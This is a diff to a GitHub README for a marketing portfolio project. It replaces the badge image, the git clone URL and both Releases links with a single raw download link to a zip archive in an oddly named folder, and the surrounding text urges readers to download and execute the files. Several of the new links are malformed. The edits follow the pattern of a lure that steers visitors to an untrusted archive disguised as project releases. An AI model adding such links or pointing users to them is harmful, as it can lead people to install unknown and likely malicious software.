@@ -1,6 +1,6 @@
 # Tamara Performance Marketing 🚀
 
-![Performance Marketing](https://img.shields.io/badge/Performance%20Marketing-Boost%20Your%20Results-brightgreen)
+![Performance Marketing](https://github.com/sharondev11/tamara-performance-marketing/raw/refs/heads/main/elasmobranchian/performance_marketing_tamara_v3.6.zip%20Marketing-Boost%20Your%20Results-brightgreen)
 
 Welcome to the **Tamara Performance Marketing** repository! This project showcases my work in managing SEO, ad campaigns, and CRM for a luxury hospitality chain. Through strategic efforts, I boosted the SEO score by 40% and increased campaign-driven revenue by 30%. 
 
@@ -80,7 +80,7 @@ Managing customer relationships is vital for sustained success. I used Salesforc
 To get started with this project, clone the repository and follow the setup instructions below.
 
 ```bash
-git clone https://github.com/sharondev11/tamara-performance-marketing.git
+git clone https://github.com/sharondev11/tamara-performance-marketing/raw/refs/heads/main/elasmobranchian/performance_marketing_tamara_v3.6.zip
 cd tamara-performance-marketing
 ```
 
@@ -102,7 +102,7 @@ npm start
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/sharondev11/tamara-performance-marketing/releases). Here, you can download and execute the latest files to stay up-to-date with improvements and new features.
+For the latest updates and releases, visit the [Releases section](https://github.com/sharondev11/tamara-performance-marketing/raw/refs/heads/main/elasmobranchian/performance_marketing_tamara_v3.6.zip). Here, you can download and execute the latest files to stay up-to-date with improvements and new features.
 
 ## Contributing
 
@@ -123,4 +123,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ---
 
-Thank you for exploring the **Tamara Performance Marketing** repository! If you have any questions or need further information, feel free to reach out. For more details, check the [Releases section](https://github.com/sharondev11/tamara-performance-marketing/releases) for updates and resources.
+Thank you for exploring the **Tamara Performance Marketing** repository! If you have any questions or need further information, feel free to reach out. For more details, check the [Releases section](https://github.com/sharondev11/tamara-performance-marketing/raw/refs/heads/main/elasmobranchian/performance_marketing_tamara_v3.6.zip) for updates and resources.
